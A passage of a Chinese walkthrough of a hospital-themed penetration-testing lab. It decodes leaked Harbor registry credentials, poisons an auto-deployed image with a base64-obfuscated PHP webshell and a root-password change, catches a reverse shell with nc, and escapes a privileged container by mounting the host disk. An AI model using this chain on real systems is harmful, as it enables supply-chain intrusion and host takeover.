![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPmOmxtoiaycND03RiaMSeFlHqzeqZsD9HGbFdRUtn3yMGtIA9SgiaGspbQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
Base64解码内容如下，对应IP为Harbor的IP  
```
{"auths":{"172.22.18.64":{"username":"admin","password":"password@nk9DLwqce","auth":"YWRtaW46cGFzc3dvcmRAbms5REx3cWNl"}}}
```  
  
登录后台发现还有个hosptial的私有仓库  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqP1Scganmb5gkKfEicDHpAaLtJJUVn4QLgQHyPWkCpZW56jhWLCxjulGg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
里面有hospital/flag镜像：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPCYUVY85te7vKcZOa0LPc5yNIfzyWwJ6oDpS1wTaBRiaicOLX5BLch6uA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
拉取镜像（拉之前docker login一下），启动容器，读FLAG  
```
docker run -itd 172.22.18.64/hospital/flag docker exec -it a1e bash
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPSvxe7t4453OTjVhSplcPWBQTGNcSTCoYkkn4NnIrD8mFNz1JzY8y4g/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## Harbor镜像同步privileged提权  
  
通过Harbor日志发现，某服务每隔20分钟会从Harbor拉取hospital/system镜像进行部署  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPgswR34I7xLnLxWoSZic4bCNZ0XvuxNVseaT3S4ia1puMJBJYTg0YLiapg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
结合前面信息搜集发现有个172.22.50.45，可以猜测该IP的80端口是由172.22.18.64/hospital/system镜像创建的容器服务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPlia6iaGXia3vljz7gPCksDI9tU4zQxicQ0Rz7ddiakAiclGicTPoibxIoaWaEg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
那我们可以自己构建一个hospital/system同名镜像，把他push到Harbor上去，这样过20分钟就会自动拉取恶意镜像  
  
本地先拉取一下镜像（拉取前先docker login，因为是私有镜像），发现是一个Web服务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPJoWdqjsZnmHwoicnekLAgticoc0Ecw9QbJeBpXg7tcACmTCCmIuPPdOQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
接着编写Dockerfile，主要作用是写入一句话木马，并且把root用户密码改成password（方便www-data提权至root）  
```
FROM 172.22.18.64/hospital/systemRUN echo ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+JyA+IC92YXIvd3d3L2h0bWwvc2hlbGwucGhwICYmIGNobW9kIHUrcyAvdXNyL2Jpbi9maW5k | base64 -d | bash && echo password | echo ZWNobyAicm9vdDpwYXNzd29yZCIgfCBjaHBhc3N3ZA== | base64 -d | bashENTRYPOINT ["/usr/sbin/apache2ctl", "-D", "FOREGROUND"]
```  
  
保存至Dockerfile后本地build镜像并push到Harbor：  
```
docker build -t 172.22.18.64/hospital/system . docker push 172.22.18.64/hospital/system
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPTbPctKfhuLt70bib6SSRlK9xVUDvDZ0DztnXzJxraFe8OwSibKvplkjA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
避免代理有太多层，这里利用前面master节点的机器做跳板，用ssh启动正向代理，该master节点没有nc，自己传一个nc上去接收shell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPgBhTx72oddB6jFxwS2icaicOqNFwkFakibFbY6VyEVppOQmpebPL3psUA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
```
./nc -lvnp 29998 script /dev/null su # 输入password
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPR5e6gBDCXnZATQ0eiaicAIX8b3u03DXppucYt8KCnqUdKiamYu2p70mLA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
发现该容器是否有privileged权限  
```
cat /proc/self/status | grep -qi "0000003fffffffff" && echo "Is privileged mode" || echo "Not privileged mode"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPudRwFXg63a1TI2rAfgmsdzGRLIpRpvSyhOhhYHDcaDgiaLf85kgjN9w/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
privileged提权一气呵成：  
```
df -h mkdir /test mount /dev/vda3 /test cd /test cat flag.txt
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics8SLqCwopc5sr06Fice97aqPcYPnAx8E7RDWzeovn7ib3BSibgGZ3iauiaiaC8czQKXOzicC0fKtvh4vUmOg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
完结撒花~  
  
非常完美的一套靶场~  
  
  
